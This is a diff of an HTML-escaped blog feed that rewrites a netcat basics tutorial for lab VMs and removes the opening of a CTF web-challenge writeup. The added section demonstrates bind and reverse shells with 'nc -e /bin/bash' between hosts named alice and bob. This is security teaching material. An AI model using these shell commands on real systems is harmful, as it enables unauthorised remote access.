+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-C&lt;span class="w"&gt; &lt;/span&gt;perdu.com&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;80&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;GET / HTTP/1.1&lt;/span&gt;
+&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;Host: perdu.com&lt;/span&gt;
 &lt;/span&gt;
-HTTP/1.1 200 OK
-Date: Thu, 17 Dec 2015 04:48:05 GMT
-Server: Apache
-Last-Modified: Tue, 02 Mar 2010 18:52:21 GMT
-ETag: &amp;quot;cc-480d5dd98a340&amp;quot;
-Accept-Ranges: bytes
-Content-Length: 204
-Vary: Accept-Encoding
-Content-Type: text/html
+&lt;span class="go"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
 
-&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Vous Etes Perdu ?&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Perdu sur l&amp;#39;Internet ?&amp;lt;/h1&amp;gt;&amp;lt;h2&amp;gt;Pas de panique, on va vous aider&amp;lt;/h2&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;pre&amp;gt;    * &amp;lt;----- vous &amp;amp;ecirc;tes ici&amp;lt;/pre&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;span class="go"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Vous Etes Perdu ?&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Perdu sur l'Internet ?&amp;lt;/h1&amp;gt;&amp;lt;h2&amp;gt;Pas de panique, on va vous aider&amp;lt;/h2&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;pre&amp;gt;    * &amp;lt;----- vous &amp;amp;ecirc;tes ici&amp;lt;/pre&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;p&gt;The &lt;code&gt;-C&lt;/code&gt; option is to send CRLF instead of LF, &lt;a href="http://stackoverflow.com/a/5757349/3672769"&gt;following the HTTP standard&lt;/a&gt;.
+Note that the highlighted lines were typed manually.&lt;/p&gt;
+&lt;h3 id="piping-the-result-of-a-command"&gt;Piping the result of a command&lt;/h3&gt;
+&lt;p&gt;We could have avoided the manual typing in the previous example by piping the result of a command into netcat.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'GET / HTTP/1.1\r\nHost: perdu.com\r\n\r\n'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;perdu.com&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;80&lt;/span&gt;
+&lt;span class="go"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
 
-&lt;p&gt;The &lt;code&gt;-C&lt;/code&gt; option is to send CRLF instead of LF, &lt;a href="https://stackoverflow.com/a/5757349/3672769"&gt;following the HTTP standard&lt;/a&gt;.&lt;/p&gt;
+&lt;span class="go"&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Vous Etes Perdu ?&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Perdu sur l'Internet ?&amp;lt;/h1&amp;gt;&amp;lt;h2&amp;gt;Pas de panique, on va vous aider&amp;lt;/h2&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;pre&amp;gt;    * &amp;lt;----- vous &amp;amp;ecirc;tes ici&amp;lt;/pre&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 &lt;h3 id="transferring-files"&gt;Transferring files&lt;/h3&gt;
 &lt;p&gt;You can transfer files (it works for binaries too) using shell redirections.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="hll"&gt;vagrant@alice:~$ nc -vl 4444 &amp;gt; received-file
-&lt;/span&gt;Listening on [0.0.0.0] (family 0, port 4444)
-Connection from [192.168.33.211] port 4444 [tcp/*] accepted (family 2, sport 41034)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;received-file
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41034&lt;/span&gt;
 
-vagrant@alice:~$ cat received-file
-This is text written by bob
-&lt;/pre&gt;&lt;/div&gt;
+&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;cat&lt;span class="w"&gt; &lt;/span&gt;received-file
+&lt;span class="hll"&gt;&lt;span class="go"&gt;This is text written by bob&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="hll"&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'This is text written by bob'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;file-to-transfer.txt
+&lt;/span&gt;
+&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="w"&gt; &lt;/span&gt;file-to-transfer.txt
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@bob:~$ echo This is text written by bob &amp;gt; file-to-transfer.txt
-
-&lt;span class="hll"&gt;vagrant@bob:~$ nc -v alice 4444 &amp;lt; file-to-transfer.txt
-&lt;/span&gt;Connection to alice 4444 port [tcp/*] succeeded!
-
-vagrant@bob:~$ # Connection closes after the transfer
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;You can also pipe the result of a command.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="hll"&gt;vagrant@alice:~$ nc -vl 4444 &amp;gt; received-input
-&lt;/span&gt;Listening on [0.0.0.0] (family 0, port 4444)
-Connection from [192.168.33.211] port 4444 [tcp/*] accepted (family 2, sport 41038)
-
-vagrant@alice:~$ cat received-input
-bob
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="hll"&gt;vagrant@bob:~$ hostname | nc -v alice 4444
-&lt;/span&gt;Connection to alice 4444 port [tcp/*] succeeded!
-
-vagrant@bob:~$ # Connection closes after the transfer
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="gp"&gt;vagrant@bob:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id="port-scanning"&gt;Port scanning&lt;/h3&gt;
-&lt;p&gt;If you don't want to interact with the port and just want to verify if it's open, you can use the &lt;code&gt;-z&lt;/code&gt; option.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@bob:~$ nc -vz alice 4444
-Connection to alice 4444 port [tcp/*] succeeded!
-&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you don't want to interact with the port and just want to verify if it's open, use the &lt;code&gt;-z&lt;/code&gt; option.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-vz&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;p&gt;For a range:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@bob:~$ nc -vz alice 4443-4445
-nc: connect to alice port 4443 (tcp) failed: Connection refused
-Connection to alice 4444 port [tcp/*] succeeded!
-nc: connect to alice port 4445 (tcp) failed: Connection refused
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;For a range (an extra &lt;code&gt;-v&lt;/code&gt; is needed to show the closed ports):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-vvz&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4443&lt;/span&gt;-4445
+&lt;span class="go"&gt;alice [192.168.33.210] 4445 (?) : Connection refused&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4443 (?) : Connection refused&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;em&gt;For more advanced port scanning, you should use a real port scanner, such as &lt;a href="https://nmap.org"&gt;nmap&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
 &lt;h2 id="differences-between-netcat-versions"&gt;Differences between netcat versions&lt;/h2&gt;
 &lt;p&gt;There are 2 main versions of netcat: traditional and OpenBSD.
-So far, we used the OpenBSD version.
-Here are the package descriptions (credits to &lt;a href="http://askubuntu.com/a/426320"&gt;this askubuntu question&lt;/a&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ apt-cache show netcat-traditional
-...
- This is the &amp;quot;classic&amp;quot; netcat, written by *Hobbit*. It lacks many
- features found in netcat-openbsd.
-...
-$ apt-cache show netcat-openbsd
-...
- This package contains the OpenBSD rewrite of netcat, including support
- for IPv6, proxies, and Unix sockets.
-...
-&lt;/pre&gt;&lt;/div&gt;
-
+So far, we used the traditional version, installed by default on Kali Linux.&lt;/p&gt;
+&lt;p&gt;Here are the package descriptions (credits to &lt;a href="http://askubuntu.com/a/426320"&gt;this askubuntu question&lt;/a&gt;):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;apt-cache&lt;span class="w"&gt; &lt;/span&gt;show&lt;span class="w"&gt; &lt;/span&gt;netcat-traditional
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt; This is the "classic" netcat, written by *Hobbit*. It lacks many&lt;/span&gt;
+&lt;span class="go"&gt; features found in netcat-openbsd.&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="gp"&gt;$ &lt;/span&gt;apt-cache&lt;span class="w"&gt; &lt;/span&gt;show&lt;span class="w"&gt; &lt;/span&gt;netcat-openbsd
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;span class="go"&gt; This package contains the OpenBSD rewrite of netcat, including support&lt;/span&gt;
+&lt;span class="go"&gt; for IPv6, proxies, and Unix sockets.&lt;/span&gt;
+&lt;span class="go"&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;There is also an important differences in the usage of the "listen" mode.
-They both use the &lt;code&gt;-l&lt;/code&gt; option, but the traditional version requires you to set the port with the &lt;code&gt;-p&lt;/code&gt; option.
-So it looks like this: &lt;code&gt;nc -lp 4444&lt;/code&gt; instead of &lt;code&gt;nc -l 4444&lt;/code&gt;.
-Using the traditional syntax with the OpenBSD version seems to work, but the manpage specifies not to use it (&lt;code&gt;-l [...] It is an error to use this option in conjunction with the -p, -s, or -z options.&lt;/code&gt;), so your mileage may vary.&lt;/p&gt;
-&lt;p&gt;The OpenBSD version also doesn't contain the &lt;code&gt;-e&lt;/code&gt; or &lt;code&gt;-c&lt;/code&gt; options, which lets you execute a program or a shell command after connect.
-This is mostly used to execute a remote shell (more on that in a future post) and was called &lt;code&gt;GAPING_SECURITY_HOLE&lt;/code&gt; at some point in traditionnal netcat's &lt;a href="http://sourceforge.net/p/netcat/code/HEAD/tree/tags/netcat-0.2.2/src/netcat.c#l271"&gt;source code&lt;/a&gt;.
-There is a way to simulate these options in OpenBSD's version by using named pipes, which is explained in the manpage.&lt;/p&gt;
-&lt;h2 id="going-encrypted"&gt;Going encrypted&lt;/h2&gt;
-&lt;p&gt;Neither traditional nor OpenBSD netcat have support for SSL.
-You will have to use &lt;code&gt;ncat&lt;/code&gt; for that, which is an improved reimplementation of netcat by the &lt;a href="https://nmap.org"&gt;nmap&lt;/a&gt; team.
-It's bundled with nmap since &lt;a href="https://nmap.org/5/"&gt;version 5&lt;/a&gt;.&lt;/p&gt;
+They both use the &lt;code&gt;-l&lt;/code&gt; option, but the OpenBSD version doesn't use &lt;code&gt;-p&lt;/code&gt; to set the port.
+So it looks like this: &lt;code&gt;nc -l 4444&lt;/code&gt; instead of &lt;code&gt;nc -lp 4444&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The OpenBSD version also doesn't contain the command execution (&lt;code&gt;-e&lt;/code&gt; and &lt;code&gt;-c&lt;/code&gt;) options (more on that below).&lt;/p&gt;
+&lt;h2 id="encrypted-connections"&gt;Encrypted connections&lt;/h2&gt;
+&lt;p&gt;Neither traditional nor OpenBSD netcat support encryption.
+There is, however, a newer and improved implementation, called &lt;code&gt;ncat&lt;/code&gt;, that does.
+It is written by the &lt;a href="https://nmap.org"&gt;nmap&lt;/a&gt; team and has been bundled with nmap since &lt;a href="https://nmap.org/5/"&gt;version 5&lt;/a&gt;.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Ncat [...] is the culmination of the currently splintered family of Netcat incarnations.&lt;/p&gt;
 &lt;p&gt;-- ncat manpage&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;It supports all the options from both versions of netcat (including &lt;code&gt;-e&lt;/code&gt;/&lt;code&gt;-c&lt;/code&gt;) and adds some really interesting ones, like a list of allowed and denied IPs and, of course... SSL!
+&lt;p&gt;It supports all the options from both versions of netcat (including &lt;code&gt;-e&lt;/code&gt;/&lt;code&gt;-c&lt;/code&gt;) and adds some really interesting ones, like a list of allowed and denied IPs and, of course... &lt;a href="https://nmap.org/ncat/guide/ncat-ssl.html"&gt;SSL&lt;/a&gt;!
 It's as simple as adding &lt;code&gt;--ssl&lt;/code&gt; to both sides.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@alice:~$ ncat --ssl -vl 4444
-Ncat: Version 6.40 ( http://nmap.org/ncat )
-Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
-Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 192.168.33.211.
-Ncat: Connection from 192.168.33.211:41032.
-&lt;span class="hll"&gt;Hello from alice!
-&lt;/span&gt;Hello from bob!
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;ncat&lt;span class="w"&gt; &lt;/span&gt;--ssl&lt;span class="w"&gt; &lt;/span&gt;-vl&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Version 6.40 ( http://nmap.org/ncat )&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Listening on :::4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Listening on 0.0.0.0:4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Connection from 192.168.33.211.&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Connection from 192.168.33.211:41032.&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;ncat&lt;span class="w"&gt; &lt;/span&gt;--ssl&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: Version 6.40 ( http://nmap.org/ncat )&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: SSL connection to 192.168.33.210:4444.&lt;/span&gt;
+&lt;span class="go"&gt;Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB&lt;/span&gt;
+&lt;span class="go"&gt;Hello from alice!&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;Hello from bob!&lt;/span&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;vagrant@bob:~$ ncat --ssl -v alice 4444
-Ncat: Version 6.40 ( http://nmap.org/ncat )
-Ncat: SSL connection to 192.168.33.210:4444.
-Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB
-Hello from alice!
-&lt;span class="hll"&gt;Hello from bob!
-&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2 id="remote-shell"&gt;Remote shell&lt;/h2&gt;
+&lt;p&gt;Traditional netcat and &lt;code&gt;ncat&lt;/code&gt; both provide the &lt;code&gt;-c&lt;/code&gt; and &lt;code&gt;-e&lt;/code&gt; options&lt;sup id="sf-netcat-basics-1-back"&gt;&lt;a href="#sf-netcat-basics-1" class="simple-footnote" title="It's possible to simulate these options in OpenBSD's netcat by using named pipes."&gt;1&lt;/a&gt;&lt;/sup&gt;, which lets you execute a program or a shell command after the connection.
+It can be a very dangerous option if you don't know what you're doing, and was actually called &lt;code&gt;GAPING_SECURITY_HOLE&lt;/code&gt; at some point in &lt;a href="http://sourceforge.net/p/netcat/code/HEAD/tree/tags/netcat-0.2.2/src/netcat.c#l271"&gt;traditional netcat's source code&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This can be used to run a &lt;a href="https://nmap.org/ncat/guide/ncat-tricks.html#ncat-httpserv"&gt;simple web server&lt;/a&gt; for example, but the case that interests us is the execution of remote shells. This topic can go really deep, but here is a quick primer.&lt;/p&gt;
+&lt;h3 id="bind-shell"&gt;Bind shell&lt;/h3&gt;
+&lt;p&gt;A bind shell is when the shell is executed on the server/listener.
+The remote attacker can then simply connect to the port to receive the shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-e&lt;span class="w"&gt; &lt;/span&gt;/bin/bash
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 60146&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;hostname&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;alice&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;As the TCP/IP swiss army knife, netcat is a very useful tool with multiple usages.
-The command execution options (&lt;code&gt;-e&lt;/code&gt;/&lt;code&gt;-c&lt;/code&gt;) were not covered, but it will be the subject of a future post.
-Stay tuned!&lt;/p&gt;</summary><category term="netcat"></category><category term="vagrant"></category></entry><entry><title>CTF writeup - 9447 CTF 2015: YWS</title><link href="https://blog.jclariviere.com/posts/ctf-writeup-9447-ctf-2015-yws" rel="alternate"></link><updated>2015-11-30T00:00:00-05:00</updated><author><name>Jean-Christophe Lariviere</name></author><id>tag:blog.jclariviere.com,2015-11-30:posts/ctf-writeup-9447-ctf-2015-yws</id><summary type="html">&lt;h2 id="challenge"&gt;Challenge&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;My friend wrote a cool web server. I'm sure he's stored some great doxxxs on the website. Can you take a look and report back any interesting things you find?&lt;/p&gt;
-&lt;p&gt;The web page is at http://yws-fsiqc922.9447.plumbing&lt;/p&gt;
-&lt;p&gt;Hint! Where does the website not want you to go?&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id="writeup"&gt;Writeup&lt;/h2&gt;
-&lt;p&gt;The first thing to try is robots.txt.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ curl http://yws-fsiqc922.9447.plumbing/robots.txt
-User-agnet: *
-Disallow: /
-Disallow: /..
-Disallow: .
-Disallow: ..
-Disallow: /work
-Disallow: /imegas/
-Allow: /sounds/pljesus.wav
-&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Here, &lt;code&gt;bob&lt;/code&gt; is the attacker. He connected to &lt;code&gt;alice&lt;/code&gt; on port 4444 and was able to execute the &lt;code&gt;hostname&lt;/code&gt; command.&lt;/p&gt;
+&lt;h3 id="reverse-shell"&gt;Reverse shell&lt;/h3&gt;
+&lt;p&gt;As its name implies, a reverse shell is executed on the other side.
+The attacker starts its listener, then waits for the victim to send its shell.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@alice:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-nvlp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 4444 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 35428&lt;/span&gt;
+&lt;span class="hll"&gt;&lt;span class="go"&gt;hostname&lt;/span&gt;
+&lt;/span&gt;&lt;span class="go"&gt;bob&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;vagrant@bob:~$ &lt;/span&gt;nc&lt;span class="w"&gt; &lt;/span&gt;-v&lt;span class="w"&gt; &lt;/span&gt;alice&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-e&lt;span class="w"&gt; &lt;/span&gt;/bin/bash
+&lt;span class="go"&gt;alice [192.168.33.210] 4444 (?) open&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;Seems the author had dyslexia, but navigating to the &lt;code&gt;/images&lt;/code&gt; folder leads to a &lt;a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Directory_Indexing"&gt;directory listing&lt;/a&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;$ curl http://yws-fsiqc922.9447.plumbing/images
-&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Directory listing for /images&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Directory listing for /images&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/.&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;.&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/aangel2.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;aangel2.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/dj2.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;dj2.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/..&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;..&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/rand_tile1.jpg&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;rand_tile1.jpg&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/images/djangopowered126x54.gif&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;djangopowered126x54.gif&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
